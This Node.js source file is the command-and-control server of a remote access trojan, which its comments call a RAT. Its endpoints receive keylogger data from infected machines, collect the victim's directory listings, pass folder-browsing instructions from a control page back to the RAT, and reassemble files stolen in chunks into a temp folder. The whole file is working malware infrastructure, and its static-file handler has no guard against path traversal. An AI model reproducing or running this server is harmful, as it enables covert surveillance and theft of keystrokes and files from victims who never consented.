//run 'node Server.js' to run

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const port = 1999;//port to serve on

let keylog = [];
let folders = { files: [], current_dir: [] };

let dirman_instruction = undefined;
let tempdetails = {}

//404 page goes here
function notfoundpage(response, url) {
    response.writeHead(404);// 404 error message
    response.write('404, code: ' + url);
    console.error('File not found: ', url)
}

const server = http.createServer(function (request, response) {
    response.setHeader('Acess-Control-Allow-Origin', '*');//allow access control from client, this will automatically handle most media files

    try {

        switch (request.url) {

            case '/': case '/index.html':

                response.writeHead(200, { 'Content-type': 'text/html' });//200 ok
                fs.readFile('index.html', function (err, databuffer) {
                    if (err) {
                        notfoundpage(response, 'index');//show 404 page
                    } else {
                        response.write(databuffer);
                    }
                    response.end();//end response
                })

                break;

            case '/action/get/keylog'://send keylog as response

                response.writeHead(200, { 'Content-type': 'application/json' });
                response.end(JSON.stringify(keylog))//write and end

                break;

            case '/action/post/keylog'://receive keylog from Rat

                request.on('data', function (data) {
                    keylog = JSON.parse(data)
                    response.end()
                });

                break;

            case '/action/get/folders'://respond with folder structure

                response.writeHead(200, { 'Content-type': 'application/json' });
                response.end(JSON.stringify(folders))

                break;

            case '/action/post/folders'://receive folder structure from RAT

                request.on('data', function (data) {
                    folders = JSON.parse(data)
                    response.writeHead(200, { 'Content-type': 'application/json' });//200 ok
                    if (dirman_instruction != undefined) {
                        response.write(JSON.stringify(dirman_instruction))//Reply with instructions from control page
                        dirman_instruction = undefined;
                    }
                    response.end();
                });

                break;

            case '/action/post/folders/instruct'://receive folder instructions from Control page

                request.on('data', function (data) {
                    dirman_instruction = JSON.parse(data)
                    console.log('folder instruction data :', dirman_instruction)
                    response.writeHead(200, { 'Content-type': 'application/json' })
                    response.end(JSON.stringify({ server: 'instruction received' }))
                });

                break;

            case '/action/post/file/buffer'://Multiple file chunks should arrive in quick sucession

                request.on('data', function (data) {
                    fs.appendFile(path.join('temp/', tempdetails.base), data, function (err) { if (err) { throw err; } })
                    response.end();
                });

                break;

            case '/action/post/file/info'://receive file data instructions before buffers are posted

                request.on('data', function (data) {
                    tempdetails = JSON.parse(data);//Incomming file details before buffers
                    var fpath = path.join('temp/', tempdetails.base)

                    if (!fs.existsSync('temp/')) {
                        fs.mkdirSync('temp/')//create folder
                    } else {
                        if (fs.existsSync(fpath)) { fs.unlink(fpath, function (err) { if (err) throw err; }) }//delete file if it already exists
                    }

                    console.log('Created file: ', fpath)
                    response.end();
                });

                break;

            case '/action/get/temp': //Read and pass on the structure of the temp folder

                if(fs.existsSync('temp/')){
                    fs.readdir('temp/', function (err, files) {
                        if (err) { throw err };
                        console.log(files)
                        response.write(JSON.stringify(files))
                        response.end()
                    })
                }else{
                    response.end(JSON.stringify({}))//nothing
                }
                break;

            default://component of webpage

                if (request.url.indexOf('.css') != -1) {//requestuested url is a css file
                    response.setHeader('Content-type', 'text/css');//Set the header to css, so the client will expects a css document
                } else if (request.url.indexOf('.js') != -1) { //requestuested url is a js file
                    response.setHeader('Content-type', 'application/javascript');//Set the header to javascript, so the client will expects a javascript document
                } else if (request.url.indexOf('.html') != -1) {//requestuested url is a html file
                    response.setHeader('Content-type', 'text/html');//Set the header to html, so the client will expects a html document
                } else {
                    //media handled automatically
                }

                fs.readFile(request.url.replace('/', ''), function (err, data) {//read request.url.replace('/', '') file
                    if (err) {//error because file not found/inaccesible
                        notfoundpage(response, request.url);//show 404 page
                    } else {
                        response.writeHead(200);//200 ok
                        response.write(data);//responsepond with data from file
                    }
                    response.end();//end responseponse
                })

        }

    } catch (err) {
        console.log('Error: ', err)
    }


}).listen(port, function (err) {//Listen to a port with server

    if (err) {
        console.error(err);
    } else {
        console.log('Listening on port: ', port);

    }

})